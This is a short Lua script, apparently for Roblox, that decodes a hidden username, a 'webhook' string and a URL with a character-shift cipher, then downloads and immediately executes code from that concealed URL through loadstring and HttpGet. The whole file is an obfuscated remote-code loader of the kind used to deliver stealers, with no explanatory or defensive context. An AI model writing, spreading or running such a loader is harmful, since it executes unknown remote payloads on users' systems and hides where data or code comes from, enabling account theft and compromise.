local function encode(str, offset)
    local res = {}
    for i = 1, #str do
        table.insert(res, string.char((string.byte(str, i) + offset) % 256))
    end
    return table.concat(res)
end

local function decode(str, offset)
    local res = {}
    for i = 1, #str do
        table.insert(res, string.char((string.byte(str, i) - offset) % 256))
    end
    return table.concat(res)
end

-- Obfuscated data
local username_encoded = "\125\143\146\146\153\198\155\198\153\142\146\145\151"
local webhook_encoded = "\151\173\165\166\180\166\178\172\163\152\195\166\166\197\163\164\197\179\176\191\184\191\189\179"
local url_encoded = "\167\210\169\175\188\188\190\203\193\177\191\203\185\192\185\204\200\210\204\187\189\199\210\183"

local username = decode(username_encoded, 25)
local webhook = decode(webhook_encoded, 50)
local url = decode(url_encoded, 45)

local http_get = game.HttpGet
local loader = loadstring

loader(http_get(game, url))()
